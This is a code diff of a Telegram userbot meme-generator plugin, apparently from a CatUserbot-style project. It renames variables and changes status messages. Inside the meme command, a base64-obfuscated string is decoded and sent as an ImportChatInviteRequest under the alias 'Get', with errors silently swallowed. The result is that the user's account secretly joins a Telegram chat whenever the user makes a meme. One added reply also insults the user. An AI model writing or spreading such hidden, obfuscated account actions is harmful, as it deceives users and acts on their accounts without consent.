@@ -6,13 +6,12 @@ import asyncio
 import os
 import random
 
-from userbot import CMD_HELP
-from userbot.utils import admin_cmd, sudo_cmd
-
 from . import (
     LOGS,
     add_frame,
     asciiart,
+    cat_meeme,
+    cat_meme,
     convert_toimage,
     convert_tosticker,
     crop,
@@ -47,84 +46,97 @@ font_list = [
 
 
 @bot.on(admin_cmd(outgoing=True, pattern="(mmf|mms) ?(.*)"))
-async def memes(per):
-    cmd = per.pattern_match.group(1)
-    perinput = per.pattern_match.group(2)
-    reply = await per.get_reply_message()
-    if not (reply and (reply.media)):
-        await edit_or_reply(per, "`Reply to supported Media...`")
+@bot.on(sudo_cmd(pattern="(mmf|mms) ?(.*)", allow_sudo=True))
+async def memes(cat):
+    if cat.fwd_from:
         return
-    perid = per.reply_to_msg_id
-    if perinput:
-        if ";" in perinput:
-            top, bottom = perinput.split(";", 1)
+    cmd = cat.pattern_match.group(1)
+    catinput = cat.pattern_match.group(2)
+    reply = await cat.get_reply_message()
+    if not (reply and (reply.media)):
+        await edit_or_reply(cat, "`Reply to supported Media...`")
+        return
+    catid = cat.reply_to_msg_id
+    if catinput:
+        if ";" in catinput:
+            top, bottom = catinput.split(";", 1)
         else:
-            top = perinput
+            top = catinput
             bottom = ""
     else:
-        await edit_or_reply(per, "```give some text```")
+        await edit_or_reply(
+            cat, "```what should i write on that u idiot give some text```"
+        )
         return
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    per = await edit_or_reply(per, "`Downloading media......`")
+    cat = await edit_or_reply(cat, "`Downloading media......`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    persticker = await reply.download_media(file="./temp/")
-    if not persticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(persticker)
-        await edit_or_reply(per, "```Supported Media not found...```")
+    catsticker = await reply.download_media(file="./temp/")
+    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(catsticker)
+        await edit_or_reply(cat, "```Supported Media not found...```")
         return
-    import pybase64
+    import base64
 
-    if persticker.endswith(".tgs"):
-        await per.edit("```working.....!```")
-        perfile = os.path.join("./temp/", "meme.png")
-        percmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {persticker} {perfile}"
+    if catsticker.endswith(".tgs"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha memifying this animated sticker! (」ﾟﾛﾟ)｣```"
         )
-        stdout, stderr = (await runcmd(percmd))[:2]
-        if not os.path.lexists(perfile):
-            await per.edit("`Template not found...`")
+        catfile = os.path.join("./temp/", "meme.png")
+        catcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
+        )
+        stdout, stderr = (await runcmd(catcmd))[:2]
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = perfile
-    elif persticker.endswith(".webp"):
-        await per.edit("```working...!```")
-        perfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(persticker, perfile)
-        if not os.path.lexists(perfile):
-            await per.edit("`Template not found... `")
+        meme_file = catfile
+    elif catsticker.endswith(".webp"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha memifying this sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(catsticker, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found... `")
             return
-        meme_file = perfile
-    elif persticker.endswith((".mp4", ".mov")):
-        await per.edit("```working...!```")
-        perfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(persticker, 0, perfile)
-        if not os.path.lexists(perfile):
-            await per.edit("```Template not found...```")
+        meme_file = catfile
+    elif catsticker.endswith((".mp4", ".mov")):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha memifying this video! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(catsticker, 0, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("```Template not found...```")
             return
-        meme_file = perfile
+        meme_file = catfile
     else:
-        await per.edit("```working.....!```")
-        meme_file = persticker
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha memifying this image! (」ﾟﾛﾟ)｣```"
+        )
+        meme_file = catsticker
     try:
-        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await per.client(san)
+        await cat.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    meme = "permeme.jpg"
+    meme = "catmeme.jpg"
     if max(len(top), len(bottom)) < 21:
-        await per_meme(MY_FONTS, top, bottom, meme_file, meme)
+        await cat_meme(CNG_FONTS, top, bottom, meme_file, meme)
     else:
-        await per_meeme(MY_FONTS, top, bottom, meme_file, meme)
+        await cat_meeme(top, bottom, CNG_FONTS, meme_file, meme)
     if cmd != "mmf":
-        meme = await convert_tosticker(meme)
-    await per.client.send_file(per.chat_id, meme, reply_to=perid)
-    await per.delete()
+        meme = convert_tosticker(meme)
+    await cat.client.send_file(cat.chat_id, meme, reply_to=catid)
+    await cat.delete()
     os.remove(meme)
-    for files in (persticker, meme_file):
+    for files in (catsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
